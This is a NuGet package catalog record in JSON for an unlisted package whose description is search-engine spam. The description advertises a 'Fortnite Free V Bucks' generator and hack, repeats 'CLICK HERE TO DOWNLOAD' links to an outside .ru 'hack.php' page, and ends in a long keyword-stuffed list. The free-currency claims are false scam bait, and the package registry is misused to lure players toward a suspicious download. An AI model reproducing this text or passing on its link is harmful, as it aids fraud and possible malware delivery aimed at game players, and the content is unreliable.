{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.02.27/_fortnite-free-v-bucks-working-2022-version-owb.2.3.95.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "d3893401-8690-4c03-90d5-c4f43750b5cc",
  "catalog:commitTimeStamp": "2022-01-29T00:02:27.8842556Z",
  "created": "2022-01-26T11:33:26.413Z",
  "description": "# _Fortnite Free V Bucks Working 2022 Version owb\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://9.bltadwin.ru/hack.php](http://9.bltadwin.ru/hack.php)\n\n\n4 minutes ago ago - Fortnite Free V Bucks Generator This game is so good and has a lot of exciting things in it. Fortnite games had a large audience. Fortnite V-Bucks is our in-game currency used to purchase items. Also, learn how to redeem your V-Bucks Gift Cards sold at retail stores. Founders can earn V-Bucks by completing a variety of quests including some daily quests and Storm Shield Defense missions. Some challenges will also reward.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://9.bltadwin.ru/hack.php](http://9.bltadwin.ru/hack.php)\n\n · Fortnite vBucks Codes | hello friends welcome to the Lionjek if you are searching for the best download vbuckscard codes then this is the right place for you. Here you can find all the working and valid download vbuckscard that really works. You can redeem these codes to get exciting and surprising rewards for free. Redeem these codes before they expired Can I .  · Free Vbucks Generator Tools. Get up to , Fortnite Free VBucks. Works for PlayStation 4, Nintendo Switch, Xbox One, Android, iOS, Microsoft Windows.  · There is nothing more easy to get free V-BUCKS for free. with or generator. We’ve found a hack on fortnite. and now it’s possible to get free V-BUCKS to buy skins, packs and others thinks for Fortnite! Just need to insert your player’s id, choose amount of V-BUCKS. then click Generate! Generate free v-bucks.\n\nfortnite free v-bucks generator, fortnite free v-bucks codes, fortnite free v-bucks app, fortnite free v-bucks no verification, fortnite free v-bucks glitch, fortnite free v-bucks map code, fortnite free v-bucks no human verification, fortnite free v-bucks card, fortnite free v-bucks website, fortnite free v bucks and skins, fortnite free v bucks and skins generator, fortnite free v bucks apk, fortnite free v bucks android, fortnite free v bucks add, fortnite free v bucks ad, fortnite free v bucks advert, fortnite free v bucks, fortnite free v bucks generator, fortnite free v bucks code, fortnite free v bucks generator no human verification, fortnite free v bucks hack, fortnite free v bucks map code, fortnite free v bucks app, fortnite free v buck boost, fortnite free v bucks battle pass, fortnite free v bucks by epic games, fortnite free v bucks without battle pass, fortnite battle free v bucks, fortnite free vbucks boost working 2018, fortnite free vbucks boost working 2020, fortnite free vbucks boost working 2021, v bucks for fortnite free, fortnite free v-bucks cards, fortnite free v bucks creative map code, fortnite free v bucks codes nintendo switch, fortnite free v bucks code generator, fortnite free v bucks creative map, fortnite free v bucks codes ps4, fortnite free v bucks challenges, fortnite v-bucks free, fortnite free v bucks download, fortnite free v bucks discord, free fortnite v bucks doing challenges, fortnite free v bucks hack download, fortnite free v bucks generator download, fortnite free v bucks no download, free fortnite v bucks without downloading apps, fortnite save the world free v bucks daily, v bucks for fortnite for free, fortnite free v bucks 13500, fortnite free v bucks event, fortnite free v bucks epic games, fortnite free v bucks easy, fortnite free v bucks easy way, fortnite free v bucks no email, fortnite free v bucks generator easy, fortnite earn free v bucks, fortnite cheat engine free v bucks, fortnite free v bucks from epic games, fortnite free v bucks for nintendo switch, fortnite free v bucks fetch rewards, fortnite free v bucks for you, fortnite free v bucks for ps4, fortnite free v bucks for mobile, fortnite free v bucks for real, fortnite free v bucks for xbox, fortnite free v bucks generator for nintendo switch, fortnite free v bucks generator ps4, fortnite free v bucks generator 2020, fortnite free v bucks generator nintendo switch, fortnite free",
  "id": "_Fortnite-Free-V-Bucks-Working-2022-Version-owb",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:45:46.92Z",
  "listed": false,
  "packageHash": "DdRmm7LDpB/DxyhxNoYu7VqErCZDgnDzt85QQidu4fnSKH2IaXIFY/BaRug5dkMfUQts6oAKcTwEF2D9F3eoqA==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11541,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Fortnite-Free-V-Bucks-Working-2022-Version-owb",
  "verbatimVersion": "2.3.95",
  "version": "2.3.95",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.02.27/_fortnite-free-v-bucks-working-2022-version-owb.2.3.95.json#wzemmplxgv.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1412,
      "fullName": "wzemmplxgv.nuspec",
      "length": 4484,
      "name": "wzemmplxgv.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.02.27/_fortnite-free-v-bucks-working-2022-version-owb.2.3.95.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9469,
      "fullName": ".signature.p7s",
      "length": 9469,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}